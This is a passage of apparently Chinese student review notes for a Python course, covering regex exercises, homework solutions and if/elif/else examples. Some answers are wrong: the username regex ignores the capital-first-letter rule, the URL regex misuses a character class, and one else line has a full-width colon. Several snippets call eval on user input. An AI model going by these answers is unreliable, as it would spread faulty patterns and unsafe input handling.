<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/3a0bb45f-6953-4587-b07c-e4646810a3db.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/2338ca16-800b-4db0-a866-4cb120e0d005.png" alt="image.png"></p>
<p><strong>（8）[]方括号表示匹配几个字符之一</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4fe319ba-ad65-4725-8494-6c79950c5c2a.png" alt="image.png"></p>
<p><strong>（9）^不在方括号中，表示匹配文本的起始位置</strong></p>
<p>正则表达式分为单行和多行模式，匹配的是行的开头</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1e2d59dd-e53e-4de7-a669-0d80978ca500.png" alt="image.png"></p>
<p><strong>（10）$表示匹配文本的结尾，同样分为多行模式和单行模式</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/529753be-9b83-466a-9031-93888e5b3b0e.png" alt="image.png"></p>
<p><strong>（11）( )表示分组</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2054.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4319ffda-c24d-42df-a054-99070439c53d.png" alt="image.png"></p>
<h3 id="正则表达式切分字符串"><a href="#正则表达式切分字符串" class="headerlink" title="正则表达式切分字符串"></a>正则表达式切分字符串</h3><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2055.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2056.png" alt="image.png"></p>
<h3 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h3><p>（1）判断字符串是否为一个合法的用户名，一个合法的用户名只能包含数字、字母、下划线，并且第一个字母为大写</p>
<p><strong>^[A-Za-z0-9_]*$</strong></p>
<p>（2）匹配.com或者.cn结尾的url网址，并将其他无关信息全部过滤掉</p>
<p>(1) String &#x3D; “<a href = ‘[http://wwww.Baidu.com](http://wwww.baidu.com/)’>百度首页</a>”</p>
<p><strong>“[a-zA-Z]+:&#x2F;&#x2F;[^\s]*[.com | .cn]”</strong></p>
<p>（3）使用正则表达式校验身份证号码</p>
<p>身份证号码的规则：公民身份号码是特征组合码，由十七位数字本体码和一位数字校验码组成。排列顺序从左至右依次为：六位数字地址码，八位数字出生日期码，三位数字顺序码和一位数字校验码。</p>
<p>地址码(身份证前六位)表示编码对象第一次申领居民身份证时的常住户口所在县(市、旗、区)的行政区划代码。生日期码(身份证第七位到第十四位)表示编码对象出生的年、月、日，其中年份用四位数字表示，年、月、日之间不用分隔符。例如：1981年05月11日就用19810511表示。</p>
<p>顺序码(身份证第十五位到十七位)是县、区级政府所辖派出所的分配码，其中单数为男性分配码，双数为女性分配码</p>
<p>校验码(身份证最后一位)是根据前面十七位数字码。</p>
<p><strong>^[1-9]\d{5}[0-9]\d{3}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d{3}([0-9]|X)$</strong></p>
<h1 id="Python第二次作业"><a href="#Python第二次作业" class="headerlink" title="Python第二次作业"></a>Python第二次作业</h1><p><strong>第一题：计算几何形状的表面积与体积</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">type_judge</span>(<span class="params">geom_type</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收一个字符串为参数，根据参数判断几何体类型</span></span><br><span class="line"><span class="string">    若输入为二维图形，计算其面积</span></span><br><span class="line"><span class="string">    若输入为三维图形，计算其面积与体积</span></span><br><span class="line"><span class="string">    根据类型调用不同的函数进行运算。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> geom_type == <span class="string">&#x27;长方形&#x27;</span>:</span><br><span class="line">        length, width = <span class="built_in">map</span>(<span class="built_in">float</span>, <span class="built_in">input</span>().split())  <span class="comment"># 空格分隔的输入切分为列表并映射为浮点数</span></span><br><span class="line">        <span class="keyword">return</span> square(length, width)                 <span class="comment"># 调用函数计算长方形面积</span></span><br><span class="line">    <span class="keyword">elif</span> geom_type == <span class="string">&#x27;长方体&#x27;</span>:</span><br><span class="line">        length, width, height = <span class="built_in">map</span>(<span class="built_in">float</span>, <span class="built_in">input</span>().split())  <span class="comment"># 空格分隔的输入切分为列表并映射为浮点数</span></span><br><span class="line">        <span class="keyword">return</span> cube(length, width, height)                   <span class="comment"># 调用函数计算长方体表面积与体积</span></span><br><span class="line">    <span class="keyword">elif</span> geom_type == <span class="string">&#x27;圆形&#x27;</span>:</span><br><span class="line">        radius = <span class="built_in">float</span>(<span class="built_in">input</span>())  <span class="comment"># 输入转为浮点数</span></span><br><span class="line">        <span class="keyword">return</span> circle(radius)    <span class="comment"># 调用函数计算圆面积</span></span><br><span class="line">    <span class="keyword">elif</span> geom_type == <span class="string">&#x27;球&#x27;</span>:</span><br><span class="line">        radius = <span class="built_in">float</span>(<span class="built_in">input</span>())  <span class="comment"># 输入转为浮点数</span></span><br><span class="line">        <span class="keyword">return</span> sphere(radius)    <span class="comment"># 调用函数计算球表面积与体积</span></span><br><span class="line">    <span class="keyword">elif</span> geom_type == <span class="string">&#x27;圆柱体&#x27;</span>:</span><br><span class="line">        radius, height = <span class="built_in">map</span>(<span class="built_in">float</span>, <span class="built_in">input</span>().split())  <span class="comment"># 空格分隔的输入切分为列表并映射为浮点数</span></span><br><span class="line">        <span class="keyword">return</span> cylinder(radius, height)  <span class="comment"># 调用函数计算圆柱体表面积与体积</span></span><br><span class="line">    <span class="keyword">elif</span> geom_type == <span class="string">&#x27;圆锥&#x27;</span>:</span><br><span class="line">        radius, height = <span class="built_in">map</span>(<span class="built_in">float</span>, <span class="built_in">input</span>().split())  <span class="comment"># 空格分隔的输入切分为列表并映射为浮点数</span></span><br><span class="line">        <span class="keyword">return</span> cone(radius, height)  <span class="comment"># 调用函数计算圆锥表面积与体积</span></span><br><span class="line">    <span class="keyword">elif</span> geom_type == <span class="string">&#x27;正三棱柱&#x27;</span>:</span><br><span class="line">        side, height = <span class="built_in">map</span>(<span class="built_in">float</span>, <span class="built_in">input</span>().split())</span><br><span class="line">        <span class="keyword">return</span> tri_prism(side, height)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;未找到<span class="subst">&#123;geom_type&#125;</span>计算方法&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">length, width</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算长方形的面积&quot;&quot;&quot;</span></span><br><span class="line">    area_of_square = length * width</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;长方形的面积为<span class="subst">&#123;area_of_square:<span class="number">.2</span>f&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cube</span>(<span class="params">length, width, height</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算长方体的表面积和体积&quot;&quot;&quot;</span></span><br><span class="line">    area_of_cube = length * width * <span class="number">2</span> + width * height * <span class="number">2</span> + length * height * <span class="number">2</span></span><br><span class="line">    volume_of_cube = length * width * height</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;长方体的表面积为<span class="subst">&#123;area_of_cube:<span class="number">.2</span>f&#125;</span>, 体积为<span class="subst">&#123;volume_of_cube:<span class="number">.2</span>f&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">circle</span>(<span class="params">radius</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收圆的半径，返回圆形的面积，圆周率用math.pi&quot;&quot;&quot;</span></span><br><span class="line">    area_of_circle = math.pi * radius ** <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;圆形的面积为<span class="subst">&#123;area_of_circle:<span class="number">.2</span>f&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sphere</span>(<span class="params">radius</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收球的半径，返回球的表面积和体积，圆周率用math.pi&quot;&quot;&quot;</span></span><br><span class="line">    area_of_sphere = <span class="number">4</span> * math.pi * radius ** <span class="number">2</span></span><br><span class="line">    volume_of_sphere = <span class="number">4</span> / <span class="number">3</span> * math.pi * radius ** <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;球的表面积为<span class="subst">&#123;area_of_sphere:<span class="number">.2</span>f&#125;</span>, 体积为<span class="subst">&#123;volume_of_sphere:<span class="number">.2</span>f&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cylinder</span>(<span class="params">radius, height</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收圆柱体的底面半径和高，返回圆柱体的表面积和体积，圆周率用math.pi&quot;&quot;&quot;</span></span><br><span class="line">    area_of_cylinder = <span class="number">2</span> * math.pi * radius * (radius + height)</span><br><span class="line">    volume_of_cylinder = math.pi * radius ** <span class="number">2</span> * height</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;圆柱体的表面积为<span class="subst">&#123;area_of_cylinder:<span class="number">.2</span>f&#125;</span>, 体积为<span class="subst">&#123;volume_of_cylinder:<span class="number">.2</span>f&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cone</span>(<span class="params">radius, height</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;接收圆锥的底面半径和高，返回圆锥的表面积和体积，圆周率用math.pi&quot;&quot;&quot;</span></span><br><span class="line">    area_of_cone = math.pi * radius * (radius + math.sqrt(radius ** <span class="number">2</span> + height ** <span class="number">2</span>))</span><br><span class="line">    volume_of_cone = <span class="number">1</span> / <span class="number">3</span> * math.pi * radius ** <span class="number">2</span> * height</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;圆锥的表面积为<span class="subst">&#123;area_of_cone:<span class="number">.2</span>f&#125;</span>, 体积为<span class="subst">&#123;volume_of_cone:<span class="number">.2</span>f&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考前面的方法自定义一个函数计算正三棱柱的表面积与体积，</span></span><br><span class="line"><span class="comment"># 函数名为tri_prism()</span></span><br><span class="line"><span class="comment"># 函数接受底边长和高两个参数side, height</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tri_prism</span>(<span class="params">side, height</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算正三棱柱的表面积与体积&quot;&quot;&quot;</span></span><br><span class="line">    area_of_tri_prism = side * <span class="number">3</span> * height + side ** <span class="number">2</span> * math.sqrt(<span class="number">3</span>) / <span class="number">2</span></span><br><span class="line">    volume_of_tri_prism = side ** <span class="number">2</span> * math.sqrt(<span class="number">3</span>) / <span class="number">4</span> * height</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;正三棱柱的表面积为<span class="subst">&#123;area_of_tri_prism:<span class="number">.2</span>f&#125;</span>, 体积为<span class="subst">&#123;volume_of_tri_prism:<span class="number">.2</span>f&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    type_of_geometry = <span class="built_in">input</span>()               <span class="comment"># 接收用户输入的字符串</span></span><br><span class="line">    geometry = type_judge(type_of_geometry)  <span class="comment"># 调用判断图形类型的函数</span></span><br><span class="line">    <span class="built_in">print</span>(geometry)                          <span class="comment"># 输出函数运行结果</span></span><br></pre></td></tr></table></figure>

<p><strong>第二题：计算弓形的面积</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 输入弦长度，浮点数#</span></span><br><span class="line">chord = <span class="built_in">float</span>(<span class="built_in">input</span>( ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入弓高度，浮点数#</span></span><br><span class="line">bow = <span class="built_in">float</span>(<span class="built_in">input</span>( ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算半弦长#</span></span><br><span class="line">half_chord = chord / <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算半径#</span></span><br><span class="line">radius = (half_chord**<span class="number">2</span> + bow**<span class="number">2</span>)/(<span class="number">2</span>*bow)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算圆心角#</span></span><br><span class="line">central_angle=<span class="number">2</span>*math.asin(half_chord/radius)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算弓形所在扇形的面积#</span></span><br><span class="line">area_of_sector = central_angle/(math.pi*<span class="number">2</span>) * math.pi *radius**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算三角形面积</span></span><br><span class="line">area_of_triangle = <span class="number">1</span>/<span class="number">2</span> * (radius**<span class="number">2</span>) * math.sin(central_angle)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算弓形面积#</span></span><br><span class="line">area_of_arch = area_of_sector - area_of_triangle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在两行中分别输出半径和弓形面积#</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0:.2f&#125;&quot;</span>.<span class="built_in">format</span>(radius))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0:.2f&#125;&quot;</span>.<span class="built_in">format</span>(area_of_arch))</span><br></pre></td></tr></table></figure>

<p><strong>第三题：学费计算</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python = <span class="number">3</span></span><br><span class="line">math = <span class="number">4</span></span><br><span class="line">english = <span class="number">4</span></span><br><span class="line">physical = <span class="number">2</span></span><br><span class="line">military_theory = <span class="number">2</span></span><br><span class="line">philosophy = <span class="number">2</span></span><br><span class="line">total = python + math + english + physical + military_theory + philosophy</span><br><span class="line">per_fee=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">fee= total * per_fee</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你本学期选修了&#123;&#125;个学分。&quot;</span>.<span class="built_in">format</span>(total))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你应缴纳的学费为&#123;&#125;元。&quot;</span>.<span class="built_in">format</span>(fee))</span><br></pre></td></tr></table></figure>

<p><strong>第四题：商店找钱</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">money=<span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line">m50 = math.floor(money/<span class="number">50</span>)</span><br><span class="line">money = money % <span class="number">50</span></span><br><span class="line">m5 = math.floor(money/<span class="number">5</span>)</span><br><span class="line">money = money % <span class="number">5</span></span><br><span class="line">m1 = math.floor(money/<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;50yuan：&quot;</span>,m50)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;5yuan：&quot;</span>,m5)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1yuan：&quot;</span>,m1)</span><br></pre></td></tr></table></figure>

<p><strong>第五题：获得用户的输入当作宽度，以*作为填充符号右对齐输出PYTHON字符串</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">w = <span class="built_in">input</span>()  <span class="comment"># 请输入输出宽度：</span></span><br><span class="line">s = <span class="string">&quot;PYTHON&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:*&gt;&#123;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(s, w))</span><br></pre></td></tr></table></figure>

<p><strong>第六题：获得用户输入，无论输入内容多少，以30字符宽度居中输出其中最多前10个字符，‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬如果不足10个字符，则全部输出</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>()  <span class="comment"># 请输入信息：</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:^30&#125;&quot;</span>.<span class="built_in">format</span>(s[:<span class="number">10</span>]))</span><br></pre></td></tr></table></figure>

<p><strong>第七题：获得输入正整数N，反转输出该正整数，不考虑异常情况</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N=<span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(N[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p><strong>第八题：字母统计a</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>(s.count(<span class="string">&#x27;a&#x27;</span>)) </span><br></pre></td></tr></table></figure>

<p><strong>第九题：三次方格式化</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">eval</span>(<span class="built_in">input</span>())<span class="comment">#获取输入并转换为数值</span></span><br><span class="line">result = <span class="built_in">str</span>(a ** <span class="number">3</span>)<span class="comment">#计算三次方并转为字符串</span></span><br><span class="line">formatted_result = result.center(<span class="number">20</span>, <span class="string">&#x27;-&#x27;</span>)<span class="comment">#居中并用 &#x27;-&#x27; 填充</span></span><br><span class="line"><span class="built_in">print</span>(formatted_result)</span><br></pre></td></tr></table></figure>

<h1 id="程序的控制结构"><a href="#程序的控制结构" class="headerlink" title="程序的控制结构"></a>程序的控制结构</h1><p><strong>程序的基本结构</strong></p>
<p>顺序结构是程序的基础，但单一的顺序结构不可能解决所有问题。</p>
<p>程序由三种基本结构组成：顺序结构、分支结构、循环结构</p>
<p>这些基本结构都有一个入口和一个出口。任何程序都由这三种基本结构组合而成。</p>
<h2 id="程序的分支结构"><a href="#程序的分支结构" class="headerlink" title="程序的分支结构"></a>程序的分支结构</h2><h3 id="单分支结构if语句"><a href="#单分支结构if语句" class="headerlink" title="单分支结构if语句"></a>单分支结构if语句</h3><p>*Python中if语句的语法格式如下：</p>
<p>if  &lt;条件&gt;:<br>语句块</p>
<p>语句块是if条件满足后执行的一个或多个语句序列。语句块中语句通过与if所在行形成缩进表达包含关系。if语句首先评估&lt;条件&gt;的结果值，如果结果为True，则执行语句块里的语句序列，然后控制转向程序的下一条语句。如果结果为False，语句块里的语句会被跳过。</p>
<p>if语句中语句块执行与否依赖于条件判断。但无论什么情况，控制都会转到if语句后与该语句同级别的下一条语句。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2057.png" alt="image.png"></p>
<p>if语中&lt;条件&gt;部分可以使用任何能够产生True或False的语句</p>
<p>形成判断条件最常见的方式是采用关系操作符</p>
<p>*Python语言共有6个关系操作符：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2058.png" alt="image.png"></p>
<p>（1）If x &#x3D;&#x3D; True:可简写做 If x（2）If支持链式比较： if 0 &lt; x &lt; 10:（3）判断是否为空，要用 is None（4）Python列表推导式中，可以用if进行过滤</p>
<p><em>条件组合：*<em>用于条件组合的三个操作符</em></em></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2059.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2060.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#微实例4.4：PM 2.5空气质量提醒（1）</span></span><br><span class="line">PM = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入PM2.5数值: &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>&lt;= PM &lt; <span class="number">35</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;空气优质，快去户外运动!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">35</span> &lt;= PM &lt;<span class="number">75</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;空气良好，适度户外活动！&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">75</span> &lt;= PM:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;空气污染，请小心！&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="二分支结构-if-else语句"><a href="#二分支结构-if-else语句" class="headerlink" title="二分支结构:if-else语句"></a>二分支结构:if-else语句</h3><p>Python中if-else语句用来形成二分支结构，语法格式如下：</p>
<p>if &lt;条件&gt;:<br>&lt;语句块1&gt;<br>else:<br>&lt;语句块2&gt;</p>
<p>&lt;语句块1&gt;是在if条件满足后执行的一个或多个语句序列。&lt;语句块2&gt;是if条件不满足后执行的语句序列。二分支语句用于区分&lt;条件&gt;的两种可能True或者False，分别形成执行路径。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#微实例4.5：PM 2.5空气质量提醒（2）</span></span><br><span class="line">PM = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入PM2.5数值: &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> PM &gt;= <span class="number">75</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;空气存在污染，请小心！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;空气没有污染，可以开展户外运动!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>二分支结构还有一种更简洁的表达方式，适合通过判断返回特定值，语法格式如下：**&lt;表达式1&gt;  if  &lt;条件&gt; else &lt;表达式2&gt;**</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PM = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入PM2.5数值: &quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;空气&#123;&#125;污染!&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;存在&quot;</span> <span class="keyword">if</span> PM &gt;= <span class="number">75</span> <span class="keyword">else</span> <span class="string">&quot;没有&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>简单的条件判断语句可以用if三元运算符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Results = <span class="string">&quot;Positive&quot;</span> <span class="keyword">if</span> x &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&quot;Negative&quot;</span></span><br></pre></td></tr></table></figure>

<p>if…else的紧凑结构非常适合对特殊值处理的情况如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;count = <span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;count <span class="keyword">if</span> count!=<span class="number">0</span> <span class="keyword">else</span> <span class="string">&quot;不存在&quot;</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;count = <span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;count <span class="keyword">if</span> count!=<span class="number">0</span> <span class="keyword">else</span> <span class="string">&quot;不存在&quot;</span></span><br><span class="line"><span class="string">&quot;不存在&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="多分支结构-if-elif-else语句"><a href="#多分支结构-if-elif-else语句" class="headerlink" title="多分支结构: if-elif-else语句"></a>多分支结构: if-elif-else语句</h3><p>Python的if-elif-else描述多分支结构，语句格式如下：</p>
<p>if &lt;条件1&gt;:<br>&lt;语句块1&gt;<br>elif &lt;条件2&gt;:<br>&lt;语句块2&gt;<br>…<br>else:<br>&lt;语句块N&gt;</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2061.png" alt="image.png"></p>
<p>多分支结构是二分支结构的扩展，这种形式通常用于设置同一个判断条件的多条执行路径。</p>
<p>Python依次评估寻找第一个结果为True的条件，执行该条件下的语句块，同时结束后跳过整个if-elif-else结构，执行后面的语句。如果没有任何条件成立，else下面的语句块被执行。else子句是可选的，</p>
<p>微实例4.4通过多条独立的if语句对同一个变量PM进行判断，这种情况更适合多分支结构，改造后的代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PM = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入PM2.5数值: &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> &lt;= PM &lt; <span class="number">35</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;空气优质，快去户外运动!&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">35</span> &lt;= PM &lt;<span class="number">75</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;空气良好，适度户外活动！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;空气污染，请小心！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>实例：身体质量指数BMI</p>
<p>BMI的定义如下：BMI &#x3D; 体重（kg）÷身高^2（m^2）。例如，一个人身高1.75米、体重75公斤，他的BMI值为24.49</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2062.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e5.1CalBMI.py</span></span><br><span class="line">height, weight = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入身高(米)和体重\(公斤)[逗号隔开]: &quot;</span>))</span><br><span class="line">bmi = weight / <span class="built_in">pow</span>(height, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;BMI数值为：&#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(bmi))</span><br><span class="line">wto, dom = <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> bmi &lt; <span class="number">18.5</span>:   <span class="comment"># WTO标准</span></span><br><span class="line">    wto = <span class="string">&quot;偏瘦&quot;</span></span><br><span class="line"><span class="keyword">elif</span> bmi &lt; <span class="number">25</span>:   <span class="comment"># 18.5 &lt;= bmi &lt; 25</span></span><br><span class="line">    wto = <span class="string">&quot;正常&quot;</span></span><br><span class="line"><span class="keyword">elif</span> bmi &lt; <span class="number">30</span>:   <span class="comment"># 25 &lt;= bmi &lt; 30</span></span><br><span class="line">    wto = <span class="string">&quot;偏胖&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    wto = <span class="string">&quot;肥胖&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> bmi &lt; <span class="number">18.5</span>:    <span class="comment"># 